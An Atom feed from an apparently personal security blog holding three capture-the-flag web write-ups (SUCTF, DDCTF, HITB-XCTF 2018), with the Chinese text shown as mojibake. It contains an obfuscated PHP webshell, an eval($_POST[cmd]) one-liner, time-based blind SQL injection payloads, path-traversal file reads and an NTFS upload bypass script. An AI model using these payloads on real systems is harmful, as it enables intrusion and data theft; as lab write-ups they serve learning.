<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0kami&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.0kami.cn/"/>
  <updated>2018-05-28T04:54:23.466Z</updated>
  <id>http://blog.0kami.cn/</id>
  
  <author>
    <name>0kami</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ã€CTFã€‘SUCTF 2018 éƒ¨åˆ†web writeup</title>
    <link href="http://blog.0kami.cn/2018/05/28/suctf-part-web-writeup/"/>
    <id>http://blog.0kami.cn/2018/05/28/suctf-part-web-writeup/</id>
    <published>2018-05-28T02:46:06.000Z</published>
    <updated>2018-05-28T04:54:23.466Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SUCTF"><a href="#SUCTF" class="headerlink" title="SUCTF"></a>SUCTF</h1><p>æŠ½äº†ç‚¹æ—¶é—´åšäº†2é“SUCTFçš„webé¢˜ï¼Œè®°å½•ä¸€ä¸‹writeupã€‚</p><h1 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h1><h2 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h2><p>phpçš„åŠ¨æ€å‡½æ•°æ‰§è¡Œï¼Œä»¥åŠcreate_functionæ‰€è¿”å›çš„åŒ¿åå‡½æ•°</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>è®¿é—®é¢˜ç›®ï¼Œç›´æ¥ç»™äº†æºç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$MY = create_function(&quot;&quot;,&quot;some code&quot;); // æ‰§è¡Œäº†catå‘½ä»¤ï¼Œè¯»å–flagå†…å®¹</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class="line">eval(&quot;function &apos;SUCTF_&apos;.$hash()&#123;&quot;</span><br><span class="line">    .&quot;global \$MY;&quot;</span><br><span class="line">    .&quot;\$MY();&quot;</span><br><span class="line">    .&quot;&#125;&quot;);</span><br><span class="line">if(isset($_GET[&apos;func_name&apos;]))&#123;</span><br><span class="line">    $_GET[&quot;func_name&quot;]();</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ€è·¯æ¯”è¾ƒæ˜ç¡®ï¼Œå°±æ˜¯æƒ³åŠæ³•æ‰§è¡Œcreate_functionæ‰€äº§ç”Ÿçš„åŒ¿åå‡½æ•°ã€‚<br>è€Œå…¶ä¸­SUCTF_32ï¼Œè¿™ä¸ªå‡½æ•°æ˜ç¡®æ˜¯æ²¡åŠæ³•çˆ†ç ´å‡ºæ¥çš„ã€‚é‚£ä¹ˆå°±åªèƒ½åœ¨ <code>$MY</code> ä¸Šä¸‹åŠŸå¤«ã€‚<br>æ‰“å°ä¸€ä¸‹<code>$MY</code>çš„å€¼ï¼Œå‘ç°create_functionè¿”å›äº†<code>\0lambda_{number}</code>,é‚£ä¹ˆå°±å¾ˆæ˜ç¡®äº†ï¼Œåªè¦æš´åŠ›ä¸€ä¸‹è¿™ä¸ªnumberå°±æœ‰ä¸€å®šå‡ ç‡æ‰§è¡Œè¯¥å‡½æ•°ï¼Œè¿™é‡Œæˆ‘æš´åŠ›äº†å¤§æ¦‚1000å¤šå°±æœ‰2æ¡æ‰§è¡Œäº†</p><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><h2 id="è€ƒç‚¹-1"><a href="#è€ƒç‚¹-1" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><ol><li>é¦–å…ˆç¡®å®šå¯ç”¨å­—ç¬¦ï¼Œä½¿ç”¨bpå°†æ‰€æœ‰å¯è§å­—ç¬¦æš´åŠ›ä¸€éåå‘ç°å¯æ‰“å°å­—ç¬¦ä¸º<code>$ () [] _ ~ . ; =</code>ï¼Œä»¥åŠå…¶ä»–ä¸å¯æ‰“å°å­—ç¬¦ã€‚</li><li>æ ¹æ®pç‰›çš„åšå®¢ï¼Œå‘ç°å–åä¸­æ–‡å¯ä»¥èµ·åˆ°ä½œç”¨ï¼Œæµ‹è¯•<code>~({ä¸­æ–‡})</code>å‘ç°å¯æ ¹æ®ä¸­æ–‡çš„utf-8ç¼–ç çš„ä¸­é—´2ä¸ªhexç è¿›è¡Œå¯¹å­—æ¯çš„éå†<br><a href="http://www.herongyang.com/gb2312_gb/pinyin_32.html" target="_blank" rel="noopener">http://www.herongyang.com/gb2312_gb/pinyin_32.html</a></li><li><p>å‡‘å‡ºå­—ç¬¦<code>assert</code>ï¼Œ<code>_GET</code>ï¼Œå¹¶åŠ¨æ€æ‰§è¡Œã€‚<br>ä¸ºäº†å‡‘å‡ºä¸Šé¢çš„å­—ç¬¦ï¼Œæˆ‘é‡‡ç”¨é€ä¸ªåå–å<code>bin2hex(~(&#39;a&#39;))</code>è·å¾—ä¸­æ–‡utf-8ç¼–ç çš„ä¸­é—´2ä¸ªï¼Œæœè¡¨å³å¯æ‰¾åˆ°å¯¹åº”çš„ä¸­æ–‡ï¼Œå†™ä¸€ä¸‹æˆ‘çš„getshellä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=~(ç);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(æŒŸ);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(æŒŸ);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(éš™);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(å¸);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(å‹‹);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line"></span><br><span class="line">$_=~(æ ¡);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(ä¸‹);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(çº¤);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(å«Œ);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$___=$$___;</span><br><span class="line">$__($___[_]);</span><br></pre></td></tr></table></figure></li><li><p>ä¸Šä¼ äº†shellä¹‹åå°±æ¯”è¾ƒå®¹æ˜“äº†ï¼Œç¿»ç›®å½•å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;ls /&apos;)</span><br><span class="line">system(&apos;cat /Th1s_14_f14g&apos;)</span><br></pre></td></tr></table></figure></li></ol><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è®°å½•ä¸€ä¸‹getshellçš„å‘ç‚¹</p><ol><li>evalä¸æ˜¯å‡½æ•°ï¼Œæ˜¯è¯­å¥</li><li>ä¸ç”¨å¼•å·ï¼Œç”¨ä¸­æ–‡ä¹Ÿè¢«phpå½“ä½œæ˜¯å­—ç¬¦ä¸²</li><li>UTF-8ç¼–ç  <a href="http://www.herongyang.com/gb2312_gb/pinyin_32.html" target="_blank" rel="noopener">http://www.herongyang.com/gb2312_gb/pinyin_32.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SUCTF&quot;&gt;&lt;a href=&quot;#SUCTF&quot; class=&quot;headerlink&quot; title=&quot;SUCTF&quot;&gt;&lt;/a&gt;SUCTF&lt;/h1&gt;&lt;p&gt;æŠ½äº†ç‚¹æ—¶é—´åšäº†2é“SUCTFçš„webé¢˜ï¼Œè®°å½•ä¸€ä¸‹writeupã€‚&lt;/p&gt;
&lt;h1 id=&quot;Anonymous&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="ctf" scheme="http://blog.0kami.cn/categories/ctf/"/>
    
    
      <category term="suctf" scheme="http://blog.0kami.cn/tags/suctf/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFã€‘DDCTF 2018 web writeup</title>
    <link href="http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/"/>
    <id>http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/</id>
    <published>2018-04-21T12:53:50.000Z</published>
    <updated>2018-04-21T12:59:18.387Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF-2018-2é“WEB-Writeup"><a href="#DDCTF-2018-2é“WEB-Writeup" class="headerlink" title="DDCTF 2018 2é“WEB Writeup"></a>DDCTF 2018 2é“WEB Writeup</h1><h2 id="WEB00-æ•°æ®åº“çš„ç§˜å¯†"><a href="#WEB00-æ•°æ®åº“çš„ç§˜å¯†" class="headerlink" title="WEB00 æ•°æ®åº“çš„ç§˜å¯†"></a>WEB00 æ•°æ®åº“çš„ç§˜å¯†</h2><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>index.php éœ€è¦ä»¥IP:116.85.43.88è®¿é—®ï¼Œhttpå¤´åŠ å…¥ X-Forwarded-For: 116.85.43.88 ç»•è¿‡</p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2:"></a>step 2:</h4><p>ç»•è¿‡åæ˜¯ä¸€ä¸ªç®€å•çš„æŸ¥è¯¢åŠŸèƒ½ï¼Œç®€å•æµ‹è¯•åå‘ç°id,title,dateæœ‰å®‰å…¨å¤„ç†ï¼Œä½†æ˜¯è¡¨å•ä¸­è¿˜éšè—ç€authorï¼Œå¹¶ä¸”æ²¡æœ‰åšä»»ä½•å¤„ç†ã€‚ä»¥payload<code>a%&#39; &amp;&amp; &#39;%&#39;=&#39;%</code>ã€<code>a%&#39; &amp;&amp; &#39;%&#39;!=&#39;%</code>ç¡®å®šæ³¨å…¥å­˜åœ¨,æƒ³ç€ç”¨unionç›´æ¥æå–å‡ºæ¥ï¼Œå‘ç°åå°è¿˜æœ‰WAFï¼Œæ²¡ç»•è¿‡å»ï¼Œä½†æ˜¯å¯¹äºç›²æ³¨ï¼ŒæˆåŠŸæ„é€ å‡ºäº†payload<code>a%&#39;&amp;&amp;if(1, sleep (5),1)=&#39;%</code>,å‘ç”Ÿ5ç§’å»¶è¿Ÿã€‚ï¼ˆåæ¥æƒ³æƒ³å…¶å®å¯ä»¥ç”¨boolå‹ç›²æ³¨æå–æ•°æ®ï¼‰</p><h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3:"></a>step 3:</h4><p>ç¡®è®¤äº†authorå­—æ®µå¯ä»¥æ³¨å…¥ï¼Œä½†æ˜¯è¿™é“é¢˜è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯sha1æ ¡éªŒï¼Œè¦æƒ³å†™è„šæœ¬ï¼Œå¿…é¡»å…ˆè§£å†³è¿™ä¸ªé—®é¢˜ã€‚ç ”ç©¶äº†ä¸€ä¸‹main.jsï¼Œå‘ç°ä»¥ç±»ä¼¼<code>id=title=date=author=time=</code>çš„å­—ç¬¦ä¸²sha1å¤„ç†ååå°æ ¡éªŒ</p><h4 id="step-4"><a href="#step-4" class="headerlink" title="step 4:"></a>step 4:</h4><p>å†™è„šæœ¬ï¼Œä¸»è¦åŒ…æ‹¬sha1æ ¡éªŒå’Œæ—¶é—´ç›²æ³¨ï¼Œè´´ä¸€ä¸‹payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit &#123;0&#125;,1)=&#123;1&#125;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">payload_2 = &quot;a%&apos; &amp;&amp; if((selEct substr(schema_name,&#123;0&#125;,1) from information_schema.schemata limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line"># è·å–åˆ°åº“å ddctf</span><br><span class="line">payload_3 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">payload_4 = &quot;a%&apos; &amp;&amp; if((selEct substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line"># è·å–åˆ°è¡¨å message, ctf_key4</span><br><span class="line">payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line">payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(column_name,&#123;0&#125;,1) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line"># è·å–åˆ°åˆ—å ctf_key4:secvalue; message: id,title,author,time,status</span><br><span class="line">payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line">payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(secvalue,&#123;0&#125;,1) from ctf_key4 limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line"># è·å–åˆ°flag DDCTF&#123;MSBMCTFMXOCBYFYI&#125;</span><br></pre></td></tr></table></figure><h2 id="WEB01-ä¸“å±é“¾æ¥"><a href="#WEB01-ä¸“å±é“¾æ¥" class="headerlink" title="WEB01 ä¸“å±é“¾æ¥"></a>WEB01 ä¸“å±é“¾æ¥</h2><h4 id="step-1-1"><a href="#step-1-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œé¢˜ç›®åªè·Ÿé“¾æ¥IPæœ‰å…³ï¼Œæ‰€ä»¥ä¸»è¦æœ‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.48.102:5050/welcom/uuid #ä¸»é¡µ æ³¨æ„åˆ°ä¸Šé¢æœ‰email:3814166715717836733@didichuxing.com </span><br><span class="line">http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # ç»™äº†æç¤ºï¼Œåªèƒ½ä¸‹è½½.class,.ks,.ico,.xmlæ–‡ä»¶</span><br><span class="line">http://116.85.48.102:5050/news/topFiveNews # æ²¡ç”¨</span><br><span class="line">http://116.85.48.102:5050//flag/testflag/yourflag #è®¿é—®æŠ¥é”™ï¼Œä½†æ˜¯æš´éœ²äº†æ§åˆ¶å™¨è·¯å¾„com.didichuxing.ctf.controller.user.FlagController.java</span><br></pre></td></tr></table></figure></p><h4 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2:"></a>step 2:</h4><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯çŒœè·¯å¾„äº†ï¼Œåœ¨githubä¸Šæ‰¾äº†ä¸ªspringmvc+mybatisçš„<a href="https://github.com/liyifeng1994/ssm" target="_blank" rel="noopener">é¡¹ç›®</a>,ç»è¿‡æµ‹è¯•ï¼Œå‘ç°ä¸€ä¸‹å‡ ä¸ªæ–‡ä»¶</p><ul><li>../../WEB-INF/web.xml # å¾—åˆ°WEB-INF/applicationContext.xmlï¼Œcom.didichuxing.ctf.listener.InitListener</li><li>../../WEB-INF/applicationContext.xml # å¾—åˆ°classpath:mybatis/config.xml</li><li>../../WEB-INF/classes/mybatis/config.xml # å¾—åˆ°mapper/FlagMapper.xml</li><li>../../WEB-INF/classes/mapper/FlagMapper.xml # sqlè¯­å¥</li><li>../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class</li><li>../../WEB-INF/classes/sdl.ks # å¯†é’¥æ–‡ä»¶</li><li>../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class</li></ul><h4 id="step-3-1"><a href="#step-3-1" class="headerlink" title="step 3:"></a>step 3:</h4><p>æŠŠä¸Šè¿°çš„classæ–‡ä»¶<a href="http://www.javadecompilers.com/" target="_blank" rel="noopener">åœ¨çº¿åç¼–è¯‘</a>åˆ°javaï¼Œé˜…è¯»åå‘ç°flagController.java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=&#123;&quot;/getflag/&#123;email:[0-9a-zA-Z&apos;]+&#125;&quot;&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model)</span><br><span class="line">  &#123;</span><br><span class="line">    Flag flag = flagService.getFlagByEmail(email);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return &quot;Encrypted flag : &quot; + flag.getFlag();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä»¥ç”¨æˆ·çš„é‚®ç®±æ¥è·å–åŠ å¯†çš„flagï¼Œé‚®ç®±å°±æ˜¯é¦–é¡µä¸Šçš„é‚®ç®±ï¼Œç„¶åé€šè¿‡listener.javaå¾—åˆ°å…·ä½“çš„åŠ å¯†è¿‡ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;</span><br><span class="line">String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);</span><br><span class="line"></span><br><span class="line">byte[] data = cipher.doFinal(flag.getBytes());</span><br><span class="line">byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class="line"></span><br><span class="line">Flag flago = new Flag();</span><br><span class="line">flago.setId(Integer.valueOf(id));</span><br><span class="line">flago.setFlag(byte2hex(data));</span><br><span class="line">flago.setEmail(byte2hex(e));</span><br><span class="line">flago.setOriginFlag(flag);</span><br><span class="line">flago.setUuid(uuid);</span><br><span class="line">flago.setOriginEmail(email);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°Emailè¢«è½¬åŒ–ä¸º16è¿›åˆ¶çš„å½¢å¼ï¼Œæ‰€ä»¥éœ€è¦å…ˆå¯¹é‚®ç®±åšå¤„ç†ï¼Œç®€å•ç¼–å†™ä»£ç ï¼ˆåé¢æ”¾ä¸Šæ¥ï¼‰ï¼Œå¾—åˆ°8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27ï¼Œä»¥<code>http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27</code>è¯·æ±‚åå¾—åˆ°åŠ å¯†çš„flagã€‚</p><h4 id="step-4-1"><a href="#step-4-1" class="headerlink" title="step 4:"></a>step 4:</h4><p>æ¥ä¸‹æ¥å°±æ˜¯å†™ä»£ç è§£å¯†flagäº†ï¼Œå› ä¸ºå¯†é’¥æ–‡ä»¶åœ¨æ‰‹ï¼Œåªéœ€ç¼–å†™ç¨‹åºå³å¯ï¼Œå‚è€ƒ<a href="https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa" target="_blank" rel="noopener">https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa</a><br>éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œç”¨äº†ç§é’¥åŠ å¯†å…¬é’¥è§£å¯†ã€‚<br>è§£å¯†åå¾—åˆ°flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF-2018-2é“WEB-Writeup&quot;&gt;&lt;a href=&quot;#DDCTF-2018-2é“WEB-Writeup&quot; class=&quot;headerlink&quot; title=&quot;DDCTF 2018 2é“WEB Writeup&quot;&gt;&lt;/a&gt;DDCTF 2018 2é“W
      
    
    </summary>
    
      <category term="ctf" scheme="http://blog.0kami.cn/categories/ctf/"/>
    
    
      <category term="ddctf" scheme="http://blog.0kami.cn/tags/ddctf/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFã€‘HITB-XCTF 2018 web writeup</title>
    <link href="http://blog.0kami.cn/2018/04/15/hitb-xctf-2018-portion-web-writeup/"/>
    <id>http://blog.0kami.cn/2018/04/15/hitb-xctf-2018-portion-web-writeup/</id>
    <published>2018-04-15T05:02:52.000Z</published>
    <updated>2018-04-15T05:20:55.117Z</updated>
    
    <content type="html"><![CDATA[<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><h2 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h2><p>windowså¹³å°çš„ä¸€äº›ç‰¹æ€§</p><ul><li><p>windowså¹³å°ç‰¹æ€§<br>windowsä¸‹æœç´¢æ–‡ä»¶ç”¨åˆ°çš„æ˜¯FindFirstFileï¼Œè¯¥å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¼šå°†<code>&quot;&lt;&quot; =&gt; &quot;*&quot;</code>ã€<code>&quot;&gt;&quot; =&gt; &quot;?&quot;</code>ã€<code>&quot; =&gt; .</code>ï¼Œæ‰€ä»¥åœ¨åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§ã€‚e.g.  </p><pre><code>`?filename=a&gt;  =&gt;  a?` åŒ¹é…å•ä¸ªå­—ç¬¦ `?filename=a&lt;  =&gt;  a*` åŒ¹é…å¤šä¸ªå­—ç¬¦`?filename=a&quot;  =&gt;  a.` </code></pre></li><li><p>NTFS ADSç‰¹æ€§</p></li></ul><table><thead><tr><th style="text-align:center">ä¸Šä¼ çš„æ–‡ä»¶å</th><th style="text-align:center">ç³»ç»Ÿç»“æœ</th></tr></thead><tbody><tr><td style="text-align:center">test.php:a.jpg</td><td style="text-align:center">ç”Ÿæˆtest.phpï¼Œä½†æ˜¯æ— å†…å®¹</td></tr><tr><td style="text-align:center">test.php::$DATA</td><td style="text-align:center">ç”Ÿæˆtest.phpï¼Œæœ‰å†…å®¹</td></tr><tr><td style="text-align:center">test.php::$INDEX_ALLOCATION</td><td style="text-align:center">ç”Ÿæˆtest.phpæ–‡ä»¶å¤¹</td></tr><tr><td style="text-align:center">test.php::$DATA.jpg</td><td style="text-align:center">ç”Ÿæˆ0.jpgï¼Œæœ‰å†…å®¹</td></tr><tr><td style="text-align:center">test.php::$DATA\test.jpg</td><td style="text-align:center">ç”Ÿæˆaaa.jpgï¼Œæœ‰å†…å®¹</td></tr></tbody></table><h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><ul><li><p>step 1:<br>åŠŸèƒ½ç‚¹#æ–‡ä»¶ä¸Šä¼  #ä¸Šä¼ æ–‡ä»¶å®½é«˜ =&gt; getshell<br>ç¯å¢ƒï¼šIIS7.0 Windows Server 2008 Standard Edition Service Pack 2</p></li><li><p>step 2:<br>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½é»‘åå•phpï¼Œæ–‡ä»¶åå‰ç¼€æ—¶é—´æˆ³é‡å†™ï¼Œä½†æˆªå–ä¸Šä¼ æ–‡ä»¶åçš„æœ€åä¸€ä¸ªåç¼€ä¸å˜ã€‚ç®€å•åˆ©ç”¨ADSç‰¹æ€§ï¼Œä¸Šä¼ test.php::$DATA</p></li><li><p>step 3:<br>ä¸Šä¼ äº†æ–‡ä»¶åï¼Œéœ€è¦æ‰¾åˆ°æ–‡ä»¶ç›®å½•ã€‚pic.phpè¿”å›äº†ä¸Šä¼ æ–‡ä»¶å®½å’Œé«˜ï¼ŒçŒœæµ‹å…¶ä½¿ç”¨äº†getimagesizeï¼Œæƒ³åˆ°å‰æ®µæ—¶é—´çš„ä¸€ç¯‡<a href="https://xianzhi.aliyun.com/forum/topic/2064" target="_blank" rel="noopener">å¸–å­</a>ï¼Œå†™ä¸ªè„šæœ¬è·‘è¯¥å¤æ‚ç›®å½•</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Created by wh1t3P1g at 2018/4/11</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">str=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">ret=&quot;&quot;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for c in str:</span><br><span class="line">        t=ret+c</span><br><span class="line">        url=&quot;http://47.90.97.18:9999/pic.php?filename=../&quot;+t+&quot;%3C/1523456340.jpg&quot;</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        if &quot;width&quot; in r.content:</span><br><span class="line">            ret+=c</span><br><span class="line">            print ret</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç›®å½•87194f13726af7cee27ba2cfe97b60df</p><ul><li>step 4:<br>æœ‰äº†ç›®å½•å°±èƒ½è®¿é—®ä¸Šä¼ çš„ä¸€å¥è¯<code>&lt;?php eval($_POST[cmd]);?&gt;</code>ï¼Œç³»ç»Ÿç¦ç”¨äº†æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ä¸€äº›å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œå¹¶ä¸éœ€è¦æ‰§è¡Œå‘½ä»¤ã€‚<br>è¿™é‡Œä¸æˆªå›¾äº†<br><code>cmd=var_dump(glob(&quot;../*&quot;));</code>å¾—åˆ°flag.phpï¼Œè®¿é—®åå‘ç°éœ€è¦è¯»å–flag.phpçš„å†…å®¹<br><code>cmd=echo readfile(&quot;../flag.php&quot;);</code>å¾—åˆ°flag</li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™æ¬¡å°±åšäº†ä¸€é“webï¼Œè¿˜æœ‰å¾…æé«˜å’Œç§¯ç´¯:)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;upload&quot;&gt;&lt;a href=&quot;#upload&quot; class=&quot;headerlink&quot; title=&quot;upload&quot;&gt;&lt;/a&gt;upload&lt;/h1&gt;&lt;h2 id=&quot;è€ƒç‚¹&quot;&gt;&lt;a href=&quot;#è€ƒç‚¹&quot; class=&quot;headerlink&quot; title=&quot;è€ƒç‚¹&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="ctf" scheme="http://blog.0kami.cn/categories/ctf/"/>
    
    
